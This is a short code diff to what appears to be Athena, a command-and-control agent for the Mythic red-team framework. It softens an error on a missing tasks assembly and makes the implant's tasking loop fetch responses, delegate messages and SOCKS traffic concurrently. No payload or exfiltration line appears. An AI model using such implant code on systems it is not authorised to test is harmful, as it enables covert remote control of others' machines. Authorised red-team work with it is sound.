@@ -146,7 +146,7 @@ profiles.Add("Athena.Profiles.SMB");
 
                     if (_tasksAsm == null)
                     {
-                        throw new Exception("Could not find loaded tasks assembly.");
+                        continue;
                     }
                     foreach (Type t in _tasksAsm.GetTypes())
                     {
@@ -189,7 +189,7 @@ profiles.Add("Athena.Forwarders.Empty");
 
                     if (_tasksAsm == null)
                     {
-                        throw new Exception("Could not find loaded tasks assembly.");
+                        continue;
                     }
                     foreach (Type t in _tasksAsm.GetTypes())
                     {
@@ -261,13 +261,19 @@ profiles.Add("Athena.Forwarders.Empty");
         //public async Task<List<MythicTask>> GetTasks(List<object> responses, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessage)
         public async Task<List<MythicTask>> GetTasks()
         {
-            List<string> responses = await this.commandHandler.GetResponses();
+            Task<List<string>> responseTask = this.commandHandler.GetResponses();
+            Task<List<DelegateMessage>> delegateTask = this.forwarder.GetMessages();
+            Task<List<SocksMessage>> socksTask = this.socksHandler.GetMessages();
+            await Task.WhenAll(responseTask, delegateTask, socksTask);
+
+            List<string> responses = await responseTask;
+
             GetTasking gt = new GetTasking()
             {
                 action = "get_tasking",
                 tasking_size = -1,
-                delegates = await this.forwarder.GetMessages(),
-                socks = await this.socksHandler.GetMessages(),
+                delegates = await delegateTask,
+                socks = await socksTask,
                 responses = responses,
             };
             
